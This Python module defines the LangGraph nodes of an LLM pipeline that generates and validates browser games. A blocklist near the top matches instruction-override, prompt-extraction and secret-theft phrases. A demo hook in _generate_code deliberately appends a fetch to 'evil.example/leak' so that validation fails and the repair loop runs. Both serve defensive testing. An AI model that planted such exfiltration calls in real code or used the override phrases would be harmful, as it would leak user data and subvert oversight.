"""LangGraph nodes for PlayForge generation.

The graph is fixed and safety-critical steps are deterministic. Creative work
is bounded inside node decisions: choose a proven game archetype, tune balance,
render local templates, validate static safety, run gameplay QA, and repair
balance before publishing.
"""
import json
import re

from app.agents import bundles, llm, prompts, templating, validation
from app.agents.state import MAX_GAMEPLAY_REPAIR, MAX_REPAIR, MAX_REPLAN
from app.storage import s3

_BLOCKED = [
    r"ignore (previous|all) (instructions|prompts)",
    r"system prompt",
    r"document\.cookie",
    r"process\.env",
    r"\bexfiltrate\b",
    r"steal .*(key|password|secret|token)",
    r"reveal .*(key|secret|prompt)",
]

_THEMES = ["space", "neon", "candy", "forest", "retro", "ocean"]
_THEME_COVER = {
    "space": "linear-gradient(135deg,#0ea5b7,#4f46e5)",
    "neon": "linear-gradient(135deg,#7c5cff,#c026d3)",
    "candy": "linear-gradient(135deg,#ff6b9d,#ff3ea5)",
    "forest": "linear-gradient(135deg,#10b981,#065f46)",
    "retro": "linear-gradient(135deg,#ff8a3d,#ff3ea5)",
    "ocean": "linear-gradient(135deg,#0ea5b7,#2563eb)",
}

_ARCHETYPES = {
    "lane_runner": {
        "genre": "runner",
        "label": "lane runner",
        "loop": "change lanes, collect bonuses, dodge incoming obstacles",
    },
    "topdown_collect": {
        "genre": "arcade",
        "label": "top-down collect-and-dodge",
        "loop": "free-move through an arena, collect rewards, avoid roaming hazards",
    },
    "logic_grid": {
        "genre": "puzzle",
        "label": "logic grid puzzle",
        "loop": "rotate tiles to connect a route before time runs out",
    },
}


def _parse_json(raw: str) -> dict:
    match = re.search(r"\{.*\}", raw or "", re.S)
    if not match:
        return {}
    try:
        return json.loads(match.group(0))
    except Exception:
        return {}


def _clip(value, limit: int = 140) -> str:
    text = re.sub(r"\s+", " ", str(value or "")).strip()
    return text if len(text) <= limit else text[: limit - 3] + "..."


def _has_any(text: str, words: list[str]) -> bool:
    return any(word in text for word in words)


def _detect_theme(prompt: str) -> str:
    p = prompt.lower()
    if _has_any(p, ["space", "star", "asteroid", "rocket", "太空", "星", "飞船"]):
        return "space"
    if _has_any(p, ["neon", "cyber", "霓虹", "赛博"]):
        return "neon"
    if _has_any(p, ["forest", "tree", "magic", "森林", "魔法"]):
        return "forest"
    if _has_any(p, ["ocean", "sea", "fish", "koi", "海", "鱼"]):
        return "ocean"
    if _has_any(p, ["candy", "sweet", "糖"]):
        return "candy"
    return next((theme for theme in _THEMES if theme in p), "retro")


def _detect_genre(prompt: str) -> str:
    p = prompt.lower()
    if _has_any(p, ["puzzle", "logic", "pipe", "circuit", "rune", "match", "解谜", "逻辑", "连接", "方块"]):
        return "puzzle"
    if _has_any(p, ["runner", "race", "dodge", "lane", "run", "dash", "躲", "跑", "赛道", "漂移"]):
        return "runner"
    return "arcade"


def _theme_cover(theme) -> str:
    return _THEME_COVER.get(str(theme or "").lower(), _THEME_COVER["retro"])


def _heuristic_spec(prompt: str) -> dict:
    genre = _detect_genre(prompt)
    theme = _detect_theme(prompt)
    controls = {
        "keyboard": ["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown"],
        "pointer": ["move"],
        "hint": "move with mouse / arrows, collect rewards, avoid hazards",
    }
    if genre == "puzzle":
        controls = {"keyboard": ["Space restart"], "pointer": ["click tiles"], "hint": "click tiles to rotate the path"}
    elif genre == "runner":
        controls = {"keyboard": ["ArrowLeft", "ArrowRight"], "pointer": ["tap left/right"], "hint": "switch lanes, collect bonuses, avoid blockers"}
    return {
        "title": bundles.title_from(prompt),
        "summary": (prompt[:117] + "...") if len(prompt) > 120 else prompt,
        "genre": genre,
        "theme": theme,
        "target_runtime": "canvas",
        "core_loop": _ARCHETYPES["logic_grid" if genre == "puzzle" else "lane_runner" if genre == "runner" else "topdown_collect"]["loop"],
        "controls": controls,
        "win_condition": "reach_target_score",
        "lose_condition": "timer_or_lives_depleted",
        "score_rule": "reward collection and efficient play",
        "difficulty_curve": "gentle opening, gradual pressure increase, no instant failure",
        "visual_style": theme,
        "tags": [theme, genre, "casual"],
    }


def _coerce_spec(data: dict, prompt: str) -> dict:
    base = _heuristic_spec(prompt)
    if isinstance(data, dict):
        for key in (
            "title",
            "summary",
            "genre",
            "theme",
            "core_loop",
            "win_condition",
            "lose_condition",
            "score_rule",
            "difficulty_curve",
            "visual_style",
        ):
            if data.get(key):
                base[key] = str(data[key])[:220]
        if isinstance(data.get("tags"), list) and data["tags"]:
            base["tags"] = [str(tag)[:30] for tag in data["tags"]][:5]
        if isinstance(data.get("controls"), dict):
            base["controls"].update(data["controls"])
    return base


def _heuristic_design(spec: dict) -> dict:
    archetype = spec.get("archetype") or ("logic_grid" if spec.get("genre") == "puzzle" else "lane_runner" if spec.get("genre") == "runner" else "topdown_collect")
    if archetype == "logic_grid":
        entities = [
            {"name": "tile", "type": "rotating_pipe", "movement": "click_rotate"},
            {"name": "source", "type": "beacon", "spawn": "left_edge"},
            {"name": "exit", "type": "beacon", "spawn": "right_edge"},
        ]
        rules = {"connect_left_to_right": "win", "timer_zero": "fail", "survive_seconds": 70}
    elif archetype == "lane_runner":
        entities = [
            {"name": "runner", "type": "avatar", "movement": "lane_switch"},
            {"name": "blocker", "type": "obstacle", "spawn": "lane_top"},
            {"name": "bonus", "type": "collectible", "spawn": "lane_top"},
        ]
        rules = {"collision_player_hazard": "lose_life", "collision_player_star": "score_plus_18", "survive_seconds": 55}
    else:
        entities = [
            {"name": "player", "type": "avatar", "movement": "top_down"},
            {"name": "hazard", "type": "obstacle", "spawn": "arena_edge"},
            {"name": "reward", "type": "collectible", "spawn": "safe_arena"},
        ]
        rules = {"collision_player_hazard": "lose_life", "collision_player_star": "score_plus_combo", "survive_seconds": 55}
    return {
        "archetype": archetype,
        "screen": {"width": 900, "height": 600},
        "entities": entities,
        "rules": rules,
        "ui": {"show_score": True, "show_timer": True, "show_lives": True, "show_restart_button": True},
    }


def _coerce_design(data: dict, spec: dict | None = None) -> dict:
    base = _heuristic_design(spec or {})
    if isinstance(data, dict):
        if isinstance(data.get("screen"), dict):
            base["screen"].update(data["screen"])
        if isinstance(data.get("entities"), list) and data["entities"]:
            base["entities"] = data["entities"][:8]
        if isinstance(data.get("rules"), dict):
            base["rules"].update(data["rules"])
        if isinstance(data.get("ui"), dict):
            base["ui"].update(data["ui"])
    return base


def _simplify_design(design: dict) -> dict:
    current = design or {}
    archetype = current.get("archetype") or "topdown_collect"
    spec = {"archetype": archetype, "genre": _ARCHETYPES.get(archetype, _ARCHETYPES["topdown_collect"])["genre"]}
    simplified = _heuristic_design(spec)
    simplified["rules"]["survive_seconds"] = 50
    return simplified


def _should_inject(state: dict) -> bool:
    p = (state.get("normalized_prompt") or state.get("prompt") or "").lower()
    if "force-replan" in p:
        return state.get("replan_attempts", 0) == 0
    if "force-repair" in p:
        return state.get("repair_attempts", 0) == 0
    return False


def _extract_js(raw: str) -> str:
    if not raw:
        return ""
    match = re.search(r"```(?:javascript|js)?\s*(.*?)```", raw, re.S | re.I)
    text = (match.group(1) if match else raw).strip()
    return re.sub(r"</?script[^>]*>", "", text, flags=re.I).strip()


def _prompt_cues(prompt: str) -> list[str]:
    stop = {
        "make",
        "game",
        "with",
        "where",
        "that",
        "this",
        "into",
        "from",
        "using",
        "player",
        "players",
        "collect",
        "avoid",
        "survive",
        "seconds",
        "the",
        "and",
        "for",
        "you",
    }
    cues: list[str] = []
    for token in re.findall(r"[a-zA-Z][a-zA-Z0-9'-]{2,}", prompt.lower()):
        if token in stop or token in cues:
            continue
        cues.append(token)
        if len(cues) == 6:
            break
    return cues


def _controls_line(controls: dict) -> str:
    keys = controls.get("keyboard") if isinstance(controls.get("keyboard"), list) else []
    pointer = controls.get("pointer") if isinstance(controls.get("pointer"), list) else []
    parts = []
    if keys:
        parts.append("keyboard=" + ", ".join(str(key) for key in keys[:4]))
    if pointer:
        parts.append("pointer=" + ", ".join(str(item) for item in pointer[:3]))
    if controls.get("hint"):
        parts.append("hint=" + _clip(controls.get("hint"), 70))
    return "; ".join(parts) if parts else "default keyboard + pointer controls"


def _spec_log_lines(spec: dict, source: str) -> list[str]:
    controls = spec.get("controls") if isinstance(spec.get("controls"), dict) else {}
    tags = ", ".join(str(tag) for tag in (spec.get("tags") or [])[:5]) or "none"
    return [
        f"source: {source}",
        f"title: {_clip(spec.get('title'), 80)}",
        f"genre/theme/runtime: {spec.get('genre', 'arcade')} / {spec.get('theme', 'retro')} / {spec.get('target_runtime', 'canvas')}",
        f"core loop: {_clip(spec.get('core_loop'), 120)}",
        f"win/lose: {spec.get('win_condition', 'reach_target_score')} / {spec.get('lose_condition', 'timer_or_lives_depleted')}",
        f"controls: {_controls_line(controls)}",
        f"tags: {tags}",
    ]


def _entity_line(entity: dict) -> str:
    name = entity.get("name", "?")
    entity_type = entity.get("type", "?")
    movement = entity.get("movement") or entity.get("spawn") or entity.get("behavior") or "static"
    return f"{name}({entity_type}, {movement})"


def _design_log_lines(design: dict) -> list[str]:
    screen = design.get("screen") if isinstance(design.get("screen"), dict) else {}
    entities = design.get("entities") if isinstance(design.get("entities"), list) else []
    rules = design.get("rules") if isinstance(design.get("rules"), dict) else {}
    balance = design.get("balance") if isinstance(design.get("balance"), dict) else {}
    entity_text = ", ".join(_entity_line(entity) for entity in entities[:8]) or "none"
    rule_bits = []
    for key in ("collision_player_hazard", "collision_player_star", "connect_left_to_right", "survive_seconds"):
        if key in rules:
            rule_bits.append(f"{key}={rules[key]}")
    lines = [
        f"archetype: {design.get('archetype', 'unknown')}",
        f"screen: {screen.get('width', 900)}x{screen.get('height', 600)} canvas",
        f"entities: {entity_text}",
        "rules: " + (", ".join(str(bit) for bit in rule_bits) or "default game loop"),
    ]
    if balance:
        lines.append(
            "balance: "
            f"duration={balance.get('round_seconds')}s, target={balance.get('target_score')}, "
            f"lives={balance.get('lives')}, hazard_spawn={balance.get('hazard_spawn_ms')}ms"
        )
    return lines


def _asset_log_lines(uploaded: list[dict], manifest: dict, spec: dict) -> list[str]:
    lines = [f"uploaded references loaded: {len(uploaded)}"]
    for asset in uploaded[:4]:
        lines.append(f"reference: {asset.get('key')} ({asset.get('type', 'file')})")
    if len(uploaded) > 4:
        lines.append(f"reference overflow: {len(uploaded) - 4} additional asset(s)")
    lines.append(f"cover strategy: theme={spec.get('theme', 'retro')} -> {manifest.get('cover')}")
    lines.append(f"asset manifest entries: cover + {len(uploaded)} uploaded reference(s)")
    return lines


def _file_log_lines(files: list[dict]) -> list[str]:
    if not files:
        return ["generated files: none"]
    total = sum(len((file.get("content") or "").encode("utf-8")) for file in files)
    names = ", ".join(file.get("path", "?") for file in files)
    lines = [f"generated files: {names}", f"bundle size: {total} bytes"]
    for file in files:
        lines.append(f"{file.get('path', '?')}: {len((file.get('content') or '').encode('utf-8'))} bytes")
    return lines


def _validation_log_lines(result: dict) -> list[str]:
    files = result.get("files") or []
    total = sum(int(file.get("size") or 0) for file in files)
    lines = [
        "checked files: " + (", ".join(str(file.get("path")) for file in files) or "none"),
        f"bundle size checked: {total} bytes",
        f"security scan: {len(validation.FORBIDDEN_PATTERNS)} forbidden patterns",
        "reference scan: index.html must load local game.js",
    ]
    if result.get("warnings"):
        lines.append("warnings: " + "; ".join(str(warning) for warning in result["warnings"][:3]))
    return lines


def _route_archetype(spec: dict, prompt: str) -> dict:
    text = " ".join(
        str(value)
        for value in [
            prompt,
            spec.get("title"),
            spec.get("genre"),
            spec.get("theme"),
            spec.get("core_loop"),
            " ".join(spec.get("tags") or []),
        ]
        if value
    ).lower()
    if _has_any(text, ["puzzle", "logic", "pipe", "circuit", "rune", "connect", "解谜", "逻辑", "连接", "方块"]):
        archetype = "logic_grid"
        reason = "logic/connect keywords"
    elif _has_any(text, ["runner", "race", "lane", "dash", "dodge", "run", "躲", "跑", "赛道", "漂移"]):
        archetype = "lane_runner"
        reason = "runner/dodge keywords"
    elif _has_any(text, ["collect", "coin", "gem", "miner", "fish", "koi", "forest", "explore", "收集", "金币", "矿", "鱼", "森林", "宝石"]):
        archetype = "topdown_collect"
        reason = "collection/exploration keywords"
    else:
        genre = str(spec.get("genre") or "").lower()
        archetype = "logic_grid" if genre == "puzzle" else "lane_runner" if genre == "runner" else "topdown_collect"
        reason = f"genre fallback: {genre or 'arcade'}"
    meta = _ARCHETYPES[archetype]
    return {"archetype": archetype, "genre": meta["genre"], "label": meta["label"], "core_loop": meta["loop"], "reason": reason}


def _difficulty_factor(prompt: str) -> float:
    p = prompt.lower()
    if _has_any(p, ["hard", "difficult", "expert", "困难", "高难", "挑战"]):
        return 1.08
    if _has_any(p, ["easy", "relax", "cozy", "简单", "休闲", "轻松"]):
        return 0.9
    return 1.0


def _balance_plan(archetype: str, spec: dict, prompt: str) -> dict:
    factor = _difficulty_factor(prompt)
    if archetype == "logic_grid":
        return {
            "round_seconds": int(72 / max(0.92, min(1.12, factor))),
            "target_score": 360,
            "lives": 3,
            "player_speed": 260,
            "hazard_speed": 120,
            "hazard_spawn_ms": 1400,
            "collectible_speed": 120,
            "collectible_spawn_ms": 900,
            "max_hazards": 4,
            "lanes": 3,
            "qa": {"min_round_seconds": 45, "requires_solution_path": True},
        }
    if archetype == "lane_runner":
        return {
            "round_seconds": 60,
            "target_score": int(185 * factor),
            "lives": 4,
            "player_speed": 280,
            "hazard_speed": int(135 * factor),
            "hazard_spawn_ms": int(1450 / factor),
            "collectible_speed": int(110 * factor),
            "collectible_spawn_ms": 780,
            "max_hazards": 6,
            "lanes": 3,
            "qa": {"min_reaction_ms": 980, "max_obstacle_density": 7.5},
        }
    return {
        "round_seconds": 65,
        "target_score": int(170 * factor),
        "lives": 4,
        "player_speed": int(330 / max(0.95, min(1.04, factor))),
        "hazard_speed": int(92 * factor),
        "hazard_spawn_ms": int(1750 / factor),
        "collectible_speed": 80,
        "collectible_spawn_ms": 720,
        "max_hazards": 6,
        "lanes": 3,
        "qa": {"min_reaction_ms": 1200, "min_player_to_hazard_ratio": 2.6, "max_obstacle_density": 6.5},
    }


def _merge_balance_into_design(design: dict, archetype: str, balance: dict) -> dict:
    merged = dict(design or {})
    merged["archetype"] = archetype
    rules = dict(merged.get("rules") if isinstance(merged.get("rules"), dict) else {})
    rules["survive_seconds"] = balance.get("round_seconds", rules.get("survive_seconds", 55))
    merged["rules"] = rules
    merged["balance"] = balance
    return merged


def _balance_log_lines(archetype: str, balance: dict) -> list[str]:
    qa = balance.get("qa") if isinstance(balance.get("qa"), dict) else {}
    return [
        f"selected playable archetype: {archetype}",
        f"round target: {balance.get('target_score')} points in {balance.get('round_seconds')}s",
        f"player/hazard: speed={balance.get('player_speed')} / {balance.get('hazard_speed')}, lives={balance.get('lives')}",
        f"spawn budget: hazard every {balance.get('hazard_spawn_ms')}ms, collectible every {balance.get('collectible_spawn_ms')}ms, max hazards={balance.get('max_hazards')}",
        "QA thresholds: " + (", ".join(f"{key}={value}" for key, value in qa.items()) or "default"),
    ]


def _gameplay_qa(state: dict) -> dict:
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    balance = state.get("balance_config") or design.get("balance") or {}
    archetype = spec.get("archetype") or design.get("archetype") or "canvas_arcade"
    validation_result = state.get("validation_result") or {}
    files = state.get("generated_files") or []
    js = next((file.get("content", "") for file in files if file.get("path") == "game.js"), "")

    issues: list[str] = []
    warnings: list[str] = []
    if not validation_result.get("valid"):
        issues.append("static validation must pass before gameplay QA")
    duration = int(balance.get("round_seconds") or 0)
    target = int(balance.get("target_score") or 0)
    lives = int(balance.get("lives") or 0)
    hazard_speed = float(balance.get("hazard_speed") or 0)
    player_speed = float(balance.get("player_speed") or 0)
    hazard_spawn = int(balance.get("hazard_spawn_ms") or 0)
    max_hazards = int(balance.get("max_hazards") or 0)
    density = round(max_hazards * 60 / max(1, duration), 2)
    ratio = round(player_speed / max(1, hazard_speed), 2)

    if duration < 35:
        issues.append("round is too short for a readable first attempt")
    if lives < 2 and archetype != "logic_grid":
        issues.append("fewer than 2 lives makes early mistakes too punishing")
    if target > max(80, duration * 7):
        warnings.append("target score may feel grindy for the round length")
    if "reset(" not in js or "document.getElementById(\"rs\").onclick" not in js:
        issues.append("restart path is not visible in generated code")

    if archetype == "topdown_collect":
        if hazard_spawn < 1300:
            issues.append("hazard spawn interval is below the safe opening threshold")
        if ratio < 2.4:
            issues.append("player movement is not sufficiently faster than hazards")
        if density > 6.8:
            issues.append("hazard density is too high for a compact browser canvas")
    elif archetype == "lane_runner":
        if hazard_spawn < 1050:
            issues.append("lane obstacles spawn too quickly for readable choices")
        if hazard_speed > 190:
            issues.append("lane obstacle speed exceeds first-session comfort band")
        if max_hazards > 8:
            issues.append("too many simultaneous lane blockers")
    elif archetype == "logic_grid":
        if duration < 45:
            issues.append("logic puzzle timer is too short")
        if "connected()" not in js:
            issues.append("logic template does not expose a win-condition check")

    return {
        "passed": not issues,
        "archetype": archetype,
        "issues": issues,
        "warnings": warnings,
        "metrics": {
            "duration": duration,
            "target_score": target,
            "lives": lives,
            "hazard_spawn_ms": hazard_spawn,
            "hazard_speed": hazard_speed,
            "player_speed": player_speed,
            "player_to_hazard_ratio": ratio,
            "hazard_density_per_minute": density,
        },
    }


def _gameplay_qa_log_lines(result: dict) -> list[str]:
    metrics = result.get("metrics") or {}
    lines = [
        f"playtest archetype: {result.get('archetype')}",
        f"metrics: duration={metrics.get('duration')}s, target={metrics.get('target_score')}, lives={metrics.get('lives')}",
        f"difficulty: spawn={metrics.get('hazard_spawn_ms')}ms, speed ratio={metrics.get('player_to_hazard_ratio')}, density/min={metrics.get('hazard_density_per_minute')}",
    ]
    if result.get("warnings"):
        lines.append("warnings: " + "; ".join(result["warnings"][:3]))
    if result.get("issues"):
        return lines + ["gameplay QA failed:"] + result["issues"][:6]
    return lines + ["gameplay QA passed: readable opening, restart path, scoring, timer, and balance thresholds"]


def _repair_balance(balance: dict, archetype: str, attempt: int) -> dict:
    repaired = dict(balance or {})
    repaired["round_seconds"] = min(90, int((repaired.get("round_seconds") or 55) + 8))
    repaired["target_score"] = max(40, int((repaired.get("target_score") or 180) * 0.86))
    repaired["lives"] = min(5, int(repaired.get("lives") or 3) + 1)
    if archetype == "logic_grid":
        repaired["round_seconds"] = min(90, int((repaired.get("round_seconds") or 70) + 12))
    else:
        repaired["player_speed"] = int((repaired.get("player_speed") or 280) * 1.08)
        repaired["hazard_speed"] = int((repaired.get("hazard_speed") or 140) * 0.78)
        repaired["hazard_spawn_ms"] = min(2600, int((repaired.get("hazard_spawn_ms") or 1200) * 1.35))
        repaired["max_hazards"] = max(4, int(repaired.get("max_hazards") or 8) - 2)
    repaired["repair_attempt"] = attempt
    return repaired


def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str]:
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    tname = templating.select_template(spec, design)
    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
    files = templating.render_files(tname, cfg)
    tokens = 0
    mode = "template"

    if state.get("use_real") and not state.get("use_template_code"):
        try:
            index_html = next((file["content"] for file in files if file["path"] == "index.html"), "")
            raw, tokens = llm.chat(prompts.CODE_SYSTEM_PROMPT, prompts.build_code_prompt(spec, design, index_html, repair_error))
            js = _extract_js(raw)
            if js and len(js) > 120:
                for file in files:
                    if file["path"] == "game.js":
                        file["content"] = js
                mode = "model"
            else:
                mode = "template (model output too short)"
        except Exception as exc:  # noqa: BLE001
            mode = f"template (model failed: {_clip(exc, 120)})"

    if _should_inject(state):
        for file in files:
            if file["path"] == "game.js":
                file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
    return files, tokens, mode


def safety_intake_node(state: dict) -> dict:
    prompt = state.get("prompt", "") or ""
    if not prompt.strip():
        return {
            "status": "failed",
            "error_code": "EMPTY_PROMPT",
            "error_message": "Prompt cannot be empty",
            "_agent": "SafetyIntakeAgent",
            "_logs": ["prompt is empty -> rejected"],
        }
    if len(prompt) > 2000:
        return {
            "status": "failed",
            "error_code": "PROMPT_TOO_LONG",
            "error_message": "Prompt too long (>2000 chars)",
            "_agent": "SafetyIntakeAgent",
            "_logs": ["prompt exceeds 2000 chars -> rejected"],
        }
    for pattern in _BLOCKED:
        if re.search(pattern, prompt, re.IGNORECASE):
            return {
                "status": "failed",
                "error_code": "SAFETY_REJECTED",
                "error_message": "Prompt rejected by safety rule",
                "_agent": "SafetyIntakeAgent",
                "_logs": [f"blocked pattern matched ({pattern}) -> rejected"],
            }
    cues = _prompt_cues(prompt)
    return {
        "normalized_prompt": prompt.strip(),
        "safety_result": {"passed": True, "risk_level": "low"},
        "_agent": "SafetyIntakeAgent",
        "_logs": [
            f"prompt accepted: {len(prompt)} chars, {len(prompt.split())} word(s)",
            "intent cues: " + (", ".join(cues) if cues else "none detected"),
            f"uploaded asset ids received: {len(state.get('asset_ids') or [])}",
            f"policy scan passed: {len(_BLOCKED)} blocked-pattern checks",
            f"normalized prompt: {_clip(prompt, 160)}",
        ],
    }


def intent_spec_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    if state.get("use_real"):
        try:
            raw, tokens = llm.chat(prompts.INTENT_SPEC_SYSTEM_PROMPT, prompts.build_intent_spec_prompt(prompt, len(state.get("asset_ids") or [])))
            spec = _coerce_spec(_parse_json(raw), prompt)
            return {"game_spec": spec, "_agent": "IntentSpecAgent", "_tokens_delta": tokens, "_logs": _spec_log_lines(spec, "model GameSpec JSON")}
        except Exception as exc:  # noqa: BLE001
            spec = _heuristic_spec(prompt)
            return {"game_spec": spec, "_agent": "IntentSpecAgent", "_logs": [f"model failed: {_clip(exc, 120)}"] + _spec_log_lines(spec, "heuristic fallback")}
    spec = _heuristic_spec(prompt)
    return {"game_spec": spec, "_agent": "IntentSpecAgent", "_logs": _spec_log_lines(spec, "offline heuristic")}


def archetype_router_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    spec = dict(state.get("game_spec") or {})
    result = _route_archetype(spec, prompt)
    spec["archetype"] = result["archetype"]
    spec["genre"] = result["genre"]
    spec["core_loop"] = result["core_loop"]
    tags = [str(tag) for tag in (spec.get("tags") or [])]
    for tag in [result["genre"], result["archetype"].replace("_", "-")]:
        if tag not in tags:
            tags.append(tag)
    spec["tags"] = tags[:5]
    return {
        "game_spec": spec,
        "archetype_result": result,
        "_agent": "ArchetypeRouterAgent",
        "_logs": [
            f"archetype selected: {result['archetype']} ({result['label']})",
            f"routing reason: {result['reason']}",
            f"core loop locked: {result['core_loop']}",
            "template family: deterministic canvas, no network, no storage",
        ],
    }


def asset_processing_node(state: dict) -> dict:
    from app.db.session import SessionLocal
    from app.models import Asset

    ids = state.get("asset_ids") or []
    uploaded = []
    if ids:
        db = SessionLocal()
        try:
            for asset in db.query(Asset).filter(Asset.id.in_(ids)).all():
                uploaded.append({"id": asset.id, "key": asset.filename, "type": asset.kind, "url": s3.public_url(asset.oss_key), "source": "uploaded"})
        finally:
            db.close()
    spec = state.get("game_spec") or {}
    asset_manifest = {"cover": _theme_cover(spec.get("theme")), "assets": uploaded}
    return {"uploaded_assets": uploaded, "asset_manifest": asset_manifest, "_agent": "AssetAgent", "_logs": _asset_log_lines(uploaded, asset_manifest, spec)}


def game_design_node(state: dict) -> dict:
    spec = state.get("game_spec") or {}
    if state.get("use_real"):
        try:
            raw, tokens = llm.chat(prompts.GAME_DESIGN_SYSTEM_PROMPT, prompts.build_game_design_prompt(spec, state.get("asset_manifest")))
            design = _coerce_design(_parse_json(raw), spec)
            return {"game_design": design, "_agent": "GameDesignAgent", "_tokens_delta": tokens, "_logs": ["source: model GameDesign JSON"] + _design_log_lines(design)}
        except Exception as exc:  # noqa: BLE001
            design = _heuristic_design(spec)
            return {"game_design": design, "_agent": "GameDesignAgent", "_logs": [f"model failed: {_clip(exc, 120)}", "source: heuristic fallback"] + _design_log_lines(design)}
    design = _heuristic_design(spec)
    return {"game_design": design, "_agent": "GameDesignAgent", "_logs": ["source: offline heuristic"] + _design_log_lines(design)}


def balance_plan_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    spec = dict(state.get("game_spec") or {})
    archetype = spec.get("archetype") or (state.get("archetype_result") or {}).get("archetype") or "topdown_collect"
    balance = _balance_plan(archetype, spec, prompt)
    design = _merge_balance_into_design(state.get("game_design") or _heuristic_design(spec), archetype, balance)
    return {
        "game_spec": spec,
        "game_design": design,
        "balance_config": balance,
        "_agent": "BalanceAgent",
        "_logs": _balance_log_lines(archetype, balance),
    }


def code_generation_node(state: dict) -> dict:
    files, tokens, mode = _generate_code(state)
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {}, state.get("balance_config"))
    tname = templating.select_template(spec, design)
    logs = [
        f"selected template: {tname}",
        f"runtime config: archetype={cfg.get('archetype')}, duration={cfg.get('duration')}s, target={cfg.get('target_score')}, lives={cfg.get('lives')}",
        f"difficulty config: hazard_speed={cfg.get('hazard_speed')}, hazard_spawn={cfg.get('hazard_spawn_ms')}ms, max_hazards={cfg.get('max_hazards')}",
        f"control hint: {_clip(cfg.get('hint'), 90)}",
        f"game.js source: {mode}",
    ] + _file_log_lines(files)
    if _should_inject(state):
        logs.append("[demo] injected forbidden API to trigger repair loop")
    return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}


def build_validation_node(state: dict) -> dict:
    result = validation.validate_files(state.get("generated_files") or [])
    if result["valid"]:
        return {"validation_result": result, "_agent": "BuildValidateAgent", "_logs": _validation_log_lines(result) + ["validation passed"]}
    return {
        "validation_result": result,
        "last_error": "; ".join(result["errors"]),
        "_agent": "BuildValidateAgent",
        "_logs": _validation_log_lines(result) + ["validation failed:"] + result["errors"][:6],
    }


def gameplay_qa_node(state: dict) -> dict:
    result = _gameplay_qa(state)
    failed = not result.get("passed")
    output = {
        "gameplay_qa_result": result,
        "_agent": "GameplayQAAgent",
        "_logs": _gameplay_qa_log_lines(result),
    }
    if failed:
        output["last_error"] = "; ".join(result.get("issues") or ["gameplay QA failed"])
        output["_step_failed"] = True
    return output


def repair_code_node(state: dict) -> dict:
    attempts = state.get("repair_attempts", 0) + 1
    files, tokens, mode = _generate_code({**state, "repair_attempts": attempts}, repair_error=state.get("last_error"))
    return {
        "generated_files": files,
        "repair_attempts": attempts,
        "_agent": "GameCodeAgentRepair",
        "_tokens_delta": tokens,
        "_logs": [
            f"repair attempt: {attempts}/{MAX_REPAIR}",
            f"previous validation error: {_clip(state.get('last_error'), 180)}",
            f"regenerated game.js using {mode}",
        ]
        + _file_log_lines(files)
        + ["queued validation retry"],
    }


def gameplay_repair_node(state: dict) -> dict:
    attempts = state.get("gameplay_repair_attempts", 0) + 1
    spec = state.get("game_spec") or {}
    archetype = spec.get("archetype") or (state.get("game_design") or {}).get("archetype") or "topdown_collect"
    balance = _repair_balance(state.get("balance_config") or (state.get("game_design") or {}).get("balance") or {}, archetype, attempts)
    design = _merge_balance_into_design(state.get("game_design") or _heuristic_design(spec), archetype, balance)
    issues = (state.get("gameplay_qa_result") or {}).get("issues") or []
    return {
        "balance_config": balance,
        "game_design": design,
        "generated_files": [],
        "validation_result": {},
        "gameplay_qa_result": {},
        "gameplay_repair_attempts": attempts,
        "last_error": None,
        "_agent": "GameplayRepairAgent",
        "_logs": [
            f"gameplay repair attempt: {attempts}/{MAX_GAMEPLAY_REPAIR}",
            "QA issues: " + ("; ".join(issues[:3]) if issues else "balance threshold miss"),
            "applied safer balance: slower hazards, wider spawn interval, lower target, extra life",
        ]
        + _balance_log_lines(archetype, balance)
        + ["queued code regeneration"],
    }


def replan_game_design_node(state: dict) -> dict:
    attempts = state.get("replan_attempts", 0) + 1
    extra = {}
    if state.get("use_real"):
        try:
            raw, tokens = llm.chat(prompts.REPLAN_SYSTEM_PROMPT, prompts.build_replan_prompt(state.get("game_spec"), state.get("game_design"), state.get("last_error")))
            design = _coerce_design(_parse_json(raw), state.get("game_spec"))
            extra = {"_tokens_delta": tokens}
        except Exception:
            design = _simplify_design(state.get("game_design"))
    else:
        design = _simplify_design(state.get("game_design"))
    return {
        "game_design": design,
        "generated_files": [],
        "validation_result": {},
        "gameplay_qa_result": {},
        "repair_attempts": 0,
        "gameplay_repair_attempts": 0,
        "replan_attempts": attempts,
        "last_error": None,
        "use_template_code": True,
        "_agent": "GameDesignAgentReplan",
        "_logs": [
            f"replan attempt: {attempts}/{MAX_REPLAN}",
            f"reason: {_clip(state.get('last_error'), 180)}",
            "simplified playable scope and switched to stable template code",
        ]
        + _design_log_lines(design)
        + ["reset repair counters; queued balance planning"],
        **extra,
    }


def publish_artifact_node(state: dict) -> dict:
    from app.services import packaging

    game_id, version_id, manifest_url = packaging.publish_generated(state)
    return {
        "status": "succeeded",
        "game_id": game_id,
        "version_id": version_id,
        "manifest_url": manifest_url,
        "preview_url": f"/play/{game_id}",
        "_agent": "PublishArtifactAgent",
        "_logs": [
            f"uploaded files: {', '.join(file.get('path', '?') for file in state.get('generated_files') or [])}",
            f"manifest url: {manifest_url}",
            f"game id: {game_id}",
            f"version id: {version_id}",
            "database saved: game + game_version with preview status",
        ],
    }


def failed_node(state: dict) -> dict:
    msg = state.get("error_message") or state.get("last_error") or "generation failed"
    return {
        "status": "failed",
        "error_message": msg,
        "_agent": "FailureHandler",
        "_logs": [
            f"task failed: {_clip(msg, 220)}",
            f"repair attempts used: {state.get('repair_attempts', 0)}/{MAX_REPAIR}",
            f"gameplay repair attempts used: {state.get('gameplay_repair_attempts', 0)}/{MAX_GAMEPLAY_REPAIR}",
            f"replan attempts used: {state.get('replan_attempts', 0)}/{MAX_REPLAN}",
        ],
    }


def done_node(state: dict) -> dict:
    return {
        "status": "succeeded",
